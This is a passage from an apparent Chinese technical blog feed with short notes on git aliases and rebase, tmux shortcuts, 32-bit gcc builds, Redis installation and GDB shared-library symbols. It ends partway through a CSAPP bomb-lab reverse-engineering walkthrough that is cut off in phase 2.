<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git config --global alias.co checkout</span><br><span class="line">git config --global alias.br branch</span><br><span class="line">git config --global alias.ci commit</span><br><span class="line">git config --global alias.st status</span><br><span class="line">git config --global alias.unstage &#x27;reset HEAD --&#x27;</span><br><span class="line">git config --global alias.last &#x27;log -1 HEAD&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p>《Pro Git》第2版： <a href="https://www.progit.cn">https://www.progit.cn</a></p>
]]></content>
      <categories>
        <category>Git</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>tmux常用操作</title>
    <url>/2020/05/04/2020-05-04-tmux-cheetsheet/</url>
    <content><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>TMUX指<strong>terminal multiplexer</strong>，即终端复用软件。tmux结构包含以下三个部分：</p>
<ul>
<li><strong>session</strong>  —— 会话，可以用tmux创建多个会话。</li>
<li><strong>window</strong>  —— 窗口， 一个会话中可以包含多个窗口。</li>
<li><strong>pane</strong>       —— 窗格，用于分隔窗口，一个窗口中可以包含多个窗格。</li>
</ul>
<span id="more"></span>

<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get install tmux</span><br></pre></td></tr></table></figure>

<h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><p><font color = 'red'><strong>说明：</strong>&lt;C-b&gt; 指 Ctrl+b键; &lt;C-b&gt; d指先按Ctrl+b键, 再按d键，不是指同时按下Ctrl+b和d</font></p>
<h4 id="session操作"><a href="#session操作" class="headerlink" title="session操作"></a>session操作</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tmux new -s &lt;session&gt;					#创建新会话</span><br><span class="line">tmux new -s &lt;session&gt; -d				#后台创建会话</span><br><span class="line">tmux ls									#列出所有会话</span><br><span class="line">tmux a -t &lt;session&gt;						#回到某个会话,a指attach</span><br><span class="line">tmux rename -t &lt;old_name&gt; &lt;new_name&gt;	#将指定会话改名</span><br><span class="line">tmux kill-session -t &lt;session&gt;			#关闭某个会话</span><br><span class="line">tmux kill-server						#重启所有tmux进程</span><br><span class="line">&lt;C-b&gt; d									#暂时离开tmux,回到终端,d指detach</span><br><span class="line">&lt;C-b&gt; s									#选择会话列表</span><br><span class="line">&lt;C-b&gt; $									#重命名当前会话</span><br></pre></td></tr></table></figure>

<h4 id="window操作"><a href="#window操作" class="headerlink" title="window操作"></a>window操作</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;C-b&gt; w									#列出所有窗口</span><br><span class="line">&lt;C-b&gt; &lt;C-o&gt;								#切换窗口顺序</span><br><span class="line">&lt;C-b&gt; 0-9								#选择几号窗口</span><br><span class="line">&lt;C-b&gt; p									#切换上一个窗口, p指previous</span><br><span class="line">&lt;C-b&gt; n									#切换下一个窗口, n指next</span><br><span class="line">&lt;C-d&gt;									#退出tmux窗口, 相当于敲exit</span><br><span class="line">&lt;C-b&gt; &amp;									#退出当前窗口, 关闭所有窗格</span><br><span class="line">&lt;C-b&gt; ,									#给窗口改名</span><br></pre></td></tr></table></figure>

<h4 id="pane操作"><a href="#pane操作" class="headerlink" title="pane操作"></a>pane操作</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;C-b&gt; %									#纵向分隔窗口</span><br><span class="line">&lt;C-b&gt; &quot; 								#横向分隔窗口</span><br><span class="line">&lt;C-b&gt; &lt;Up/Down/Left/Right&gt;				#方向键切换窗格，可通过配置改成HJKL</span><br><span class="line">&lt;C-b&gt; z									#最大化当前窗格</span><br><span class="line">&lt;C-b&gt; x									#关闭当前使用中的窗格</span><br><span class="line">&lt;C-b&gt; q									#显示序号,在序号消失前按对应序号可切换到对应窗格</span><br><span class="line">&lt;C-b&gt; o									#顺时针切换窗口</span><br><span class="line">&lt;C-b&gt; &lt;C-o&gt;								#逆时针切换窗口</span><br></pre></td></tr></table></figure>

<h4 id="上下滚动，查看历史"><a href="#上下滚动，查看历史" class="headerlink" title="上下滚动，查看历史"></a>上下滚动，查看历史</h4><p>先按<C-b>, 再按[键，进入复制模式后，用PgUp, PgDn查看历史，再按q退出。</p>
<h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>添加~&#x2F;.tmux.conf，修改内容如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">定义快捷键&lt;C-b&gt; r, 快速加载tmux配置文件</span></span><br><span class="line">bind r source-file ~/.tmux.conf \; display &quot;tmux.conf reload!&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">适应VIM操作，上下左右改为h,j,k,l</span></span><br><span class="line">bind h select-pane -L</span><br><span class="line">bind j select-pane -D</span><br><span class="line">bind k select-pane -U</span><br><span class="line">bind l select-pane -R</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">更改横分屏，竖分屏键位</span></span><br><span class="line">bind | split-window -h</span><br><span class="line">bind - split-window -v</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置窗口、窗格起始序号为1</span></span><br><span class="line">set -g base-index 1</span><br><span class="line">set -g pane-base-index 1</span><br></pre></td></tr></table></figure>

<h3 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h3><p>TMUX常用快捷键和问题 —— <a href="https://www.cnblogs.com/piperck/p/4992159.html">https://www.cnblogs.com/piperck/p/4992159.html</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>使用git rebase合并多条commit记录</title>
    <url>/2020/05/04/2020-05-04-use-git-rebase-to-merge-multi-commits/</url>
    <content><![CDATA[<h2 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h2><p><strong>首先用git log命令查看历史提交记录</strong>，示例git仓信息如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git <span class="built_in">log</span> --pretty=oneline</span></span><br><span class="line">f70c5a84996c05511d3f98034d56ca05706d62f8 (HEAD -&gt; test) fourth commit</span><br><span class="line">56a79bb29da6e483fc6de6e8f271e1a5dcba52a5 third commit</span><br><span class="line">64db6fddd02a04194b3ca22e91dd1de23f9f81d7 second commit</span><br><span class="line">783795e5285155f37c10b72ec9160e554c198ae0 first commit</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>比如这里希望合并本地的前三条记录(f70c, 56a7, 64db)，<strong>需找到待合并记录(64db)的前一条记录的commitID(7837)，作为git rebase -i命令的参数</strong>。</p>
<p><strong>输入git rebase -i 7837, 进入历史提交的编辑界面：</strong><br><img src="/2020/05/04/2020-05-04-use-git-rebase-to-merge-multi-commits/image1.png"></p>
<p>需要注意的是，上图显示的提交顺序与git log是相反的。<strong>将除了第一行的pick都改成squash, 保存退出(:wq)</strong>,再将commit信息改成merge three commit, 保存退出，再次使用git log查看：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git <span class="built_in">log</span> --pretty=oneline</span></span><br><span class="line">f448ac261c7e26682935201244eda0e9d93fd307 (HEAD -&gt; test) merge three commits</span><br><span class="line">783795e5285155f37c10b72ec9160e554c198ae0 first commit</span><br></pre></td></tr></table></figure>

<p>发现f70c, 56a7, 64db三条本地记录已经被成功合并为一条新记录。</p>
<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ul>
<li><p><font color='red'><strong>只对从未推送至公共仓库的提交记录执行git rebase</strong></font></p>
</li>
<li><p>原因可参考<a href = "https://www.progit.cn/">https://www.progit.cn/</a>  “Git分支 -&gt; 变基的风险”，该小节详细讲述了在一个公共仓库执行变基操作的问题。</p>
</li>
</ul>
<h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><p><a href = "https://www.progit.cn/">https://www.progit.cn/  </a></p>
]]></content>
      <categories>
        <category>Git</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>64位Linux机器上使用gcc编译32位程序</title>
    <url>/2020/05/31/2020-05-31-complie-32-bit-program-on-64-bit-env/</url>
    <content><![CDATA[<h2 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h2><p>安装以下软件包</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get install build-essential module-assistant gcc-multilib g++-multilib</span><br></pre></td></tr></table></figure>
<h2 id="Centos"><a href="#Centos" class="headerlink" title="Centos"></a>Centos</h2><p>安装以下软件包</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install glibc-devel.i686 libstdc++-devel.i686</span><br></pre></td></tr></table></figure>

<p>gcc编译添加-m32参数，如</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -m32 main.c</span><br></pre></td></tr></table></figure>
<span id="more"></span>


<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://notes.maxwi.com/2017/12/06/compile-x32-executable-at-x64-linux-system/">http://notes.maxwi.com/2017/12/06/compile-x32-executable-at-x64-linux-system/</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>gcc</tag>
      </tags>
  </entry>
  <entry>
    <title>如何安装和启动Redis</title>
    <url>/2020/06/01/2020-06-01-how-to-install-and-run-redis/</url>
    <content><![CDATA[<h2 id="一、源码安装redis"><a href="#一、源码安装redis" class="headerlink" title="一、源码安装redis"></a>一、源码安装redis</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">0.官网下载最新redis源码包</span></span><br><span class="line">wget http://download.redis.io/releases/redis-5.0.5.tar.gz</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">1.将redis.tar.gz拷贝到/usr/local目录并解压</span></span><br><span class="line">mkdir -p /usr/local/ &amp;&amp; cd /usr/local</span><br><span class="line">cp /path/to/redis-5.0.5.tar.gz .</span><br><span class="line">tar -zxvf redis-5.0.5.tar.gz</span><br><span class="line">mv redis-5.0.5 redis &amp;&amp; cd redis</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">2.编译、测试、安装</span></span><br><span class="line">make -j4 						# 编译</span><br><span class="line">make test						# 测试，显示All tests passed without errors</span><br><span class="line">make install					# 安装</span><br></pre></td></tr></table></figure>
<span id="more"></span>

<h2 id="二、启动和停止redis"><a href="#二、启动和停止redis" class="headerlink" title="二、启动和停止redis"></a>二、启动和停止redis</h2><h3 id="通过命令行启动redis"><a href="#通过命令行启动redis" class="headerlink" title="通过命令行启动redis"></a>通过命令行启动redis</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">redis-server 								#直接启动</span><br><span class="line">redis-server --port 6380					#自定义端口号启动，--port指定端口为6380</span><br><span class="line">redis-server /usr/local/redis/redis.conf    #启动redis时指定配置文件</span><br></pre></td></tr></table></figure>
<h3 id="通过初始化脚本启动redis"><a href="#通过初始化脚本启动redis" class="headerlink" title="通过初始化脚本启动redis"></a>通过初始化脚本启动redis</h3><ul>
<li><p>在redis源码路径的utils目录中找到初始化脚本redis_init_script, 将该脚本复制到&#x2F;etc&#x2F;init.d，文件名改为redis_端口号(如redis_6379)，脚本中修改REDISPORT变量为该端口号(如6379)</p>
</li>
<li><p>建立需要的目录， 新键&#x2F;etc&#x2F;redis目录用于存放redis配置文件，新建&#x2F;var&#x2F;redis&#x2F;端口号(如&#x2F;var&#x2F;redis&#x2F;6379)目录存放redis持久化文件</p>
</li>
<li><p>修改配置文件，将redis.conf复制到&#x2F;etc&#x2F;redis下，并改名为端口号.conf(如6379.conf)，需要修改部分参数，如下表</p>
</li>
</ul>
<table>
<thead>
<tr>
<th>参数</th>
<th>值</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>daemonize</td>
<td>yes</td>
<td>以守护模式运行redis</td>
</tr>
<tr>
<td>pidfile</td>
<td>&#x2F;var&#x2F;run&#x2F;redis_端口号.pid</td>
<td>设置redis的PID文件位置</td>
</tr>
<tr>
<td>port</td>
<td>端口号</td>
<td>设置redis监听的端口号，如6379</td>
</tr>
<tr>
<td>dir</td>
<td>&#x2F;var&#x2F;redis&#x2F;端口号</td>
<td>设置持久化文件存放位置</td>
</tr>
</tbody></table>
<h3 id="设置redis随系统自启动-Centos"><a href="#设置redis随系统自启动-Centos" class="headerlink" title="设置redis随系统自启动(Centos)"></a>设置redis随系统自启动(Centos)</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chkconfig --add redis_6379 		#增加redis服务，并通过chkconfig管理</span><br><span class="line">chkconfig redis_6379 on 		#开启服务</span><br><span class="line">chkconfig --list 				#查看redis服务级别，默认2，3，4，5为ON表示成功开启</span><br></pre></td></tr></table></figure>
<h3 id="停止redis"><a href="#停止redis" class="headerlink" title="停止redis"></a>停止redis</h3><p>强行终止redis可能导致数据丢失，正确停止redis方式是发送SHUTDOWN命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-cli SHUTDOWN</span><br></pre></td></tr></table></figure>
<p>redis收到SHUTDOWN命令后，会先断开所有客户端连接，然后根据配置执行持久化，最后退出<br>redis可以妥善处理SIGTERM信号，所以使用kill redis进程的PID也可以正常结束redis</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>[1]《Redis入门指南 第2版》<br>[2] redis安装教程：<a href="https://blog.csdn.net/qq_36737803/article/details/90578860">https://blog.csdn.net/qq_36737803&#x2F;article&#x2F;details&#x2F;90578860</a></p>
]]></content>
      <categories>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>GDB加载so库符号失败的解决方法</title>
    <url>/2020/06/21/2020-06-21-how-to-solve-gdb-load-so-failure/</url>
    <content><![CDATA[<h2 id="问题现象"><a href="#问题现象" class="headerlink" title="问题现象"></a>问题现象</h2><p>gdb调试core文件或进程时，出现加载so库符号失败，错误信息如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">warning: Could not load shared library symbols for ../libadd.so</span><br><span class="line">Do you need &quot;set solib-search-path&quot; or &quot;set sysroot&quot;?</span><br></pre></td></tr></table></figure>
<p>执行<strong>info sharedlibrary</strong>，查看Syms Read字段为No,  表示对应so库符号加载失败。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">pwd</span> /home/gdb</span></span><br><span class="line">(gdb) info sharedlibrary</span><br><span class="line">From                To                  Syms Read   Shared Object Library</span><br><span class="line">0x00007fba2c572570  0x00007fba2c57267b  No          ../libadd.so</span><br><span class="line">0x00007fba2c370570  0x00007fba2c37066b  No          ../../var/libsub.so</span><br><span class="line">(gdb) bt</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">0  0x00007fba2c57266b <span class="keyword">in</span> ?? ()</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">1  0x00007ffc6f703ff0 <span class="keyword">in</span> ?? ()</span></span><br></pre></td></tr></table></figure>
<span id="more"></span>


<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>设置gdb的<strong>solib-search-path</strong>选项， 指定加载失败的so的搜索路径即可。</p>
<p>solib-search-path可以指定多个路径。在linux上，路径之间用冒号分隔，命令如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) set solib-search-path /var:/home</span><br><span class="line">Reading symbols from ../libadd.so...done.</span><br><span class="line">Loaded symbols for ../libadd.so</span><br><span class="line">Reading symbols from ../../var/libsub.so...done.</span><br><span class="line">Loaded symbols for ../../var/libsub.so</span><br><span class="line">(gdb) info sharedlibrary</span><br><span class="line">From                To                  Syms Read   Shared Object Library</span><br><span class="line">0x00007fba2c572570  0x00007fba2c57267b  Yes         ../libadd.so</span><br><span class="line">0x00007fba2c370570  0x00007fba2c37066b  Yes         ../../var/libsub.so</span><br><span class="line">(gdb) bt</span><br><span class="line">#0  0x00007fba2c57266b in add (a=1, b=2) at add.c:5</span><br><span class="line">#1  0x0000000000400600 in ?? ()</span><br></pre></td></tr></table></figure>

<p>或者设置gdb的<strong>solib-absolute-prefix</strong>选项，指定被搜索so文件路径的前缀， 与solib-search-path区别在于solib-absolute-prefix只能有一个，使用如下gdb指令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(gdb) set solib-absolute-prefix /</span><br><span class="line">(gdb) set sysroot /					# sysroot是solib-absolute-prefix的别名</span><br></pre></td></tr></table></figure>

<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://visualgdb.com/gdbreference/commands/set_solib-search-path">https://visualgdb.com/gdbreference/commands/set_solib-search-path</a></p>
]]></content>
      <categories>
        <category>GDB</category>
      </categories>
      <tags>
        <tag>GDB</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP 二进制炸弹实验</title>
    <url>/2020/07/26/2020-07-26-csapp-bomblab/</url>
    <content><![CDATA[<h3 id="实验简介"><a href="#实验简介" class="headerlink" title="实验简介"></a>实验简介</h3><p>二进制炸弹是一个作为目标代码提供的程序。运行时提示用户输入6个不同的字符串，如其中一个字符串不正确，炸弹会引爆并打印一条错误信息。需要通过反汇编确定输入的6个字符串，从而拆除炸弹。</p>
<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ul>
<li>汇编语言基础</li>
<li>GDB和OBJDUMP工具的使用</li>
</ul>
<span id="more"></span>

<h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><p>Centos7 x86_64</p>
<h3 id="获取二进制炸弹"><a href="#获取二进制炸弹" class="headerlink" title="获取二进制炸弹"></a>获取二进制炸弹</h3><p>首先从CSAPP官网获取二进制炸弹<code>bomb.tar</code>:  <a href="http://csapp.cs.cmu.edu/3e/labs.html">http://csapp.cs.cmu.edu/3e/labs.html</a></p>
<p>在linux下执行<code>tar xvf bomb.tar</code>，得到二进制炸弹的文件，文件列表如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">|-- bomb		# 二进制炸弹，x86-64位</span><br><span class="line">|-- bomb.c		# 主程序，逻辑是接受用户输入的6个字符串，并判断每个字符串是否正确。如果正确，调用phase_defused进入下一关，否则调用explode_bomb引爆炸弹</span><br></pre></td></tr></table></figure>

<h3 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h3><h4 id="1-首先理解main函数执行过程"><a href="#1-首先理解main函数执行过程" class="headerlink" title="1. 首先理解main函数执行过程"></a>1. 首先理解main函数执行过程</h4><p>反汇编炸弹，使用<code>objdump -d bomb &gt; bomb.txt</code>命令，内容如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000400da0 &lt;main&gt;:</span><br><span class="line">  400da0:   53                      push   %rbx</span><br><span class="line">  ......</span><br><span class="line">  400e19:   e8 84 05 00 00          callq  4013a2 &lt;initialize_bomb&gt;</span><br><span class="line">  400e1e:   bf 38 23 40 00          mov    $0x402338,%edi</span><br><span class="line">  400e23:   e8 e8 fc ff ff          callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  400e28:   bf 78 23 40 00          mov    $0x402378,%edi</span><br><span class="line">  400e2d:   e8 de fc ff ff          callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  400e32:   e8 67 06 00 00          callq  40149e &lt;read_line&gt; # 接受用户输入的字符串，保存到%rax寄存器</span><br><span class="line">  400e37:   48 89 c7                mov    %rax,%rdi		  # 用户输入的字符串保存在$rdi寄存器，并作为phase_1函数的第一个入参传递</span><br><span class="line">  400e3a:   e8 a1 00 00 00          callq  400ee0 &lt;phase_1&gt;	  # 调用phase_1(), 执行第一关代码</span><br><span class="line">  400e3f:   e8 80 07 00 00          callq  4015c4 &lt;phase_defused&gt;</span><br></pre></td></tr></table></figure>

<p>查看<code>0x400e32</code>处的代码： 主程序调用<code>read_line</code>接收用户输入的字符串，保存到<code>$rax</code>，并且将该字符串作为函数入参传递给<code>phase_1</code>，执行第一阶段的代码。</p>
<p><font color = 'red'><strong>这里需要理解x86-64的过程调用规则：</strong></font>（关于过程调用，可参考《CSAPP原书第三版》3.7小节 —— 过程）</p>
<ul>
<li>函数调用中，<strong>利用<code>%rax</code>寄存器保存返回值。</strong></li>
<li>关于参数传递 , <strong>如果函数参数不超过6个，会依次通过<code>%rdi</code>,<code> %rsi</code>, <code>%rdx</code>, <code>%rcx</code>, <code>%r8</code>, <code>%r9</code>传递； 如超过6个参数，超出的参数利用栈传递。</strong></li>
<li><code>%rbx, %rbp, %r12~%15</code>被划分为<strong>被调用者保存寄存器</strong>；其余的寄存器，除了栈指针<code>%rsp</code>，都被划分为<strong>调用者保存寄存器</strong>。</li>
</ul>
<h4 id="2-理解phase-1执行过程"><a href="#2-理解phase-1执行过程" class="headerlink" title="2. 理解phase_1执行过程"></a>2. 理解phase_1执行过程</h4><p>查看<code>phase_1</code>的代码，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000400ee0 &lt;phase_1&gt;:</span><br><span class="line">  400ee0:   48 83 ec 08             sub    $0x8,%rsp</span><br><span class="line">  400ee4:   be 00 24 40 00          mov    $0x402400,%esi 			  # $esi作为strings_not_equal函数的第二个参数传递</span><br><span class="line">  400ee9:   e8 4a 04 00 00          callq  401338 &lt;strings_not_equal&gt; # 调用strings_not_equal函数，比较用户输入的字符串($rdi)和$esi处的字符串是否相等</span><br><span class="line">  400eee:   85 c0                   test   %eax,%eax 				  # 判断%eax的值是否为0</span><br><span class="line">  400ef0:   74 05                   je     400ef7 &lt;phase_1+0x17&gt; 	  # 如%eax等于0，跳转到400ef7,正常退出</span><br><span class="line">  400ef2:   e8 43 05 00 00          callq  40143a &lt;explode_bomb&gt; 	  # 如%eax不等于0，炸弹爆炸</span><br><span class="line">  400ef7:   48 83 c4 08             add    $0x8,%rsp</span><br><span class="line">  400efb:   c3                      retq</span><br></pre></td></tr></table></figure>

<p><code>phase_1</code>执行过程如下：</p>
<ul>
<li>首先通过<code>callq</code>指令调用<code>strings_not_equal</code>函数。根据过程调用的规则，可以确定这个函数接受2个参数。第一个参数是<code>%rdi</code>, 上面分析过，是我们拆弹时输入的字符串；第二个参数是<code>$esi</code>，值为<code>0x402400</code>。顾名思义，<code>strings_not_equal</code>函数用来判断两个字符串是否相等。</li>
<li>接着用<code>test</code>指令判断函数的返回值是否为0。如果为0进行跳转并返回，调用<code>phase_defused</code>拆除炸弹，否则通过<code>callq</code>指令调用<code>explode_bomb</code>，引爆炸弹。</li>
</ul>
<p>因此，拆弹的关键在于，确认<code>0x402400</code>地址处的字符串是什么。只需要在<code>0x400ee9</code>处打个gdb断点就可以了。</p>
<h4 id="3-gdb调试炸弹"><a href="#3-gdb调试炸弹" class="headerlink" title="3. gdb调试炸弹"></a>3. gdb调试炸弹</h4><p>执行<code>gdb bomb</code>, 设置断点<code>b *0x400ee9</code>,  执行<code>run</code>。 此时程序会要求用户输入字符串，先随便输一个字符串使程序运行到我们设置的断点 <code>0x400ee9</code>处，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># gdb bomb</span><br><span class="line">(gdb) b *0x400ee9							# 设置断点， b相当于break</span><br><span class="line">Breakpoint 1 at 0x400ee9</span><br><span class="line">(gdb) r										# 运行程序， r相当于run</span><br><span class="line">Starting program: /home/pc/CSAPP/bomb/bomb</span><br><span class="line">Welcome to my fiendish little bomb. You have 6 phases with</span><br><span class="line">which to blow yourself up. Have a nice day!</span><br><span class="line">123											# 随便输入一个字符串，让程序运行到断点0x400ee9</span><br><span class="line">Breakpoint 1, 0x0000000000400ee9 in phase_1 ()</span><br><span class="line">(gdb) p (char *)$rdi						# $rdi保存用户输入字符串，为123，与x/s $rdi指令等价</span><br><span class="line">$2 = 0x603780 &lt;input_strings&gt; &quot;123&quot;</span><br><span class="line">(gdb) x/s $esi								# 查看esi处字符串，这就是第一关的答案</span><br><span class="line">$1 = 0x402400 &quot;Border relations with Canada have never been better.&quot;</span><br></pre></td></tr></table></figure>

<p>查看<code>%esi</code>处字符串, 即第一关的答案，如下：</p>
<p><code>Border relations with Canada have never been better.</code></p>
<p>用<code>quit</code>指令退出gdb, 新建一个文件<code>answer</code>，将答案写入该文件。重新执行<code>bomb</code>程序，指定<code>answer</code>文件名作为参数，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ./bomb answer</span><br><span class="line">Welcome to my fiendish little bomb. You have 6 phases with</span><br><span class="line">which to blow yourself up. Have a nice day!</span><br><span class="line">Phase 1 defused. How about the next one?</span><br></pre></td></tr></table></figure>

<p>显示<code>Phase 1 defused</code>, 表示第一关已成功通过。</p>
<h4 id="几个调试汇编代码相关的GDB指令"><a href="#几个调试汇编代码相关的GDB指令" class="headerlink" title="几个调试汇编代码相关的GDB指令"></a>几个调试汇编代码相关的GDB指令</h4><p>使用<code>disassemble</code>指令查看汇编代码，箭头表示下一步即将执行的汇编指令。</p>
<p><code>si</code>指令用于单步执行汇编代码，相当于<code>stepi</code></p>
<p><code>ni</code>指令以函数调用为单位进行单步执行， 相当于<code>nexti</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) disassemble</span><br><span class="line">Dump of assembler code for function phase_1:</span><br><span class="line">   0x0000000000400ee0 &lt;+0&gt;:     sub    $0x8,%rsp</span><br><span class="line">   0x0000000000400ee4 &lt;+4&gt;:     mov    $0x402400,%esi</span><br><span class="line">=&gt; 0x0000000000400ee9 &lt;+9&gt;:     callq  0x401338 &lt;strings_not_equal&gt;</span><br><span class="line">   0x0000000000400eee &lt;+14&gt;:    test   %eax,%eax</span><br><span class="line">   0x0000000000400ef0 &lt;+16&gt;:    je     0x400ef7 &lt;phase_1+23&gt;</span><br><span class="line">   0x0000000000400ef2 &lt;+18&gt;:    callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400ef7 &lt;+23&gt;:    add    $0x8,%rsp</span><br><span class="line">   0x0000000000400efb &lt;+27&gt;:    retq</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<p>更多用法参考<code>gdb</code>手册或《CSAPP 原书第3版》3.10.2小节 —— 使用GDB调试器</p>
<h4 id="拆弹小技巧"><a href="#拆弹小技巧" class="headerlink" title="拆弹小技巧"></a>拆弹小技巧</h4><ul>
<li><p>查看<code>bomb</code>符号表或者直接查看汇编代码，会发现有个<code>explode_bomb</code>符号，该函数用来引爆炸弹。</p>
</li>
<li><p>调试时可以对该函数设置断点，在拆弹失败时暂停运行，不让其爆炸，便于调试。可使用 <code>b explode_bomb</code>指令设置断点</p>
</li>
</ul>
<h3 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h3><p>先贴出第二关<code>phase_2</code>的部分汇编代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000400efc &lt;phase_2&gt;:</span><br><span class="line">  400efc:   55                      push   %rbp</span><br><span class="line">  400efd:   53                      push   %rbx</span><br><span class="line">  400efe:   48 83 ec 28             sub    $0x28,%rsp</span><br><span class="line">  400f02:   48 89 e6                mov    %rsp,%rsi	# %rsi作为read_six_numbers的第二个入参传递, $rsp既是入参也是出参；第一个入参为$rdi, 即用户输入的字符串</span><br><span class="line">  400f05:   e8 52 05 00 00          callq  40145c &lt;read_six_numbers&gt; # 读六个数字</span><br><span class="line">  ......</span><br></pre></td></tr></table></figure>

<p><code>phase_2</code>程序先调用<code>read_six_numbers</code>。该函数接受两个参数，第一个参数为<code>$rdi</code>, 即我们输入的字符串；第二个参数为<code>$rsp</code>, <code>$rsp</code>既是入参也是出参，用于保存<code>read_six_numbers</code>函数解析<code>$rdi</code>后得到的6个整数。想得到这个结论，需要分析<code>read_six_numbers</code>代码，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) disassemble read_six_numbers</span><br><span class="line">Dump of assembler code for function read_six_numbers:</span><br><span class="line">   0x000000000040145c &lt;+0&gt;:     sub    $0x18,%rsp</span><br><span class="line">   0x0000000000401460 &lt;+4&gt;:     mov    %rsi,%rdx		# sscanf函数的第1个可变参数，第3个参数，通过%rdx传递</span><br><span class="line">   0x0000000000401463 &lt;+7&gt;:     lea    0x4(%rsi),%rcx	# sscanf函数的第2个可变参数，第4个参数, 通过%rcx传递</span><br><span class="line">   0x0000000000401467 &lt;+11&gt;:    lea    0x14(%rsi),%rax	# sscanf函数的第6个可变参数，第8个参数，通过栈传递</span><br><span class="line">   0x000000000040146b &lt;+15&gt;:    mov    %rax,0x8(%rsp)</span><br><span class="line">   0x0000000000401470 &lt;+20&gt;:    lea    0x10(%rsi),%rax  # sscanf函数的第5个可变参数，第7个参数，通过栈传递</span><br><span class="line">   0x0000000000401474 &lt;+24&gt;:    mov    %rax,(%rsp)</span><br><span class="line">   0x0000000000401478 &lt;+28&gt;:    lea    0xc(%rsi),%r9	# sscanf函数的第4个可变参数，第6个参数, 通过%r9传递</span><br><span class="line">   0x000000000040147c &lt;+32&gt;:    lea    0x8(%rsi),%r8	# 